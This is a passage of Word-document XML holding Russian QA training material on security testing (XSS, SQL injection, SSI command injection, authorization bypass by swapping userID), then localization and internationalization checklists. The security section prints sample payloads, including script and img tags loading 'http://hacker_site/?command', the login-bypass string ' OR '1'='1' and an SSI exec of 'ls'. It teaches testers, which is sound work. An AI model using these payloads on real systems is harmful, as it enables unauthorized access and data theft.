          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры: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IMG</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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>img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http</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hacker</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>site</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command</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w: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SCRIPT</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 xml:space="preserve">&lt;script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lang w:val="en-US"/>
        </w:rPr>
        <w:t>="http://hacker_site/?command"&gt;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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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объект</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Image</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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w: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lastRenderedPageBreak/>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo = new Image();</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>foo.src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = "http://hacker_site/?command";</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&lt;/script&gt;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 xml:space="preserve">Code injections (SQL, PHP, ASP </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>и</w:t>
      </w:r>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т</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>д</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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Вставки исполняемого кода рассмотрим на примере кода SQL.</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Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:</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073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SELECT Username</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FROM Users</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WHERE Name = 'tester'</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rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>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Вводим корректное имя ’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>’, а в поле пароль вводим строку:</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testpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>' OR '1'='1</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итоге, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Если</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> поле не имеет соответствующих </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>валидаций</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>т.к.SQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> запрос примет следующий вид:</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073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SELECT Username</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FROM Users</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WHERE Name = 'tester'</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AND Password = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>testpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>' OR '1'='1';</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Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.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зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Linux</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gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&lt; !</w:t>
      </w:r>
      <w:proofErr w:type="gram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exec</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spell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ls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>" --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B"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00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Bypass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>конфеденциальную</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> информацию, в URL страницы передается </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>userID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">, а данном случае есть смысл попробовать подставить вместо своего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>userID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.</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локализации (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>localization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Тестирование локализации - это процесс тестирования локализованной версии программного продукта. Тестирование локализации позволяет проверить насколько хорошо адаптирован продукт для определенной целевой аудитории в соответствии с ее культурными особенностями. Как правило, здесь рассматривается культурный и языковой аспекты, в частности перевод пользовательского интерфейса и соответствующей документации и файлов на другой язык, а также форматы валют, чисел, времени и телефонных номеров, и др.</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Наши высококвалифицированные специалисты занимаются локализацией русской, английской, немецкой, французской и итальянской и других версий продуктов.</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В нашей команде работают профессиональные лингвисты и QA инженеры, которые совместно работают над выявлением ошибок локализации.</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В тестирование локализации входит проверка правильности переведенного контента, различных элементов интерфейса, ошибок и системных сообщений, проверка раздела FAQ/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Help</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> и вспомогательной документации.</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 xml:space="preserve">Цель проводимого тестирования — проверить </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>мультиязычный</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> интерфейс приложения или сайта на наличие ошибок перевода, правильности почтовых адресов, имени и фамилии, валют, формата даты и времени, и пр.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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 xml:space="preserve">Как правило, мы не тестируем на наличие орфографических и грамматических ошибок. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Чеклист</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирования локализации включает в себя:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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Определение того, какие языки поддерживаются приложением;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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Проверка правильности перевода в соответствии с тематикой приложения;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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Проверка правильности перевода элементов интерфейса приложения;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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Проверка перевода раздела FAQ/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Help</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> и вспомогательной документации.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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lastRenderedPageBreak/>
        <w:t>Тестирование интернационализации представляет собой проектирование и создание продукта и документации, используя техники, упрощающие локализацию приложения. Сюда входят:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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 xml:space="preserve">создание продукта с учетом стандарта кодирования </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
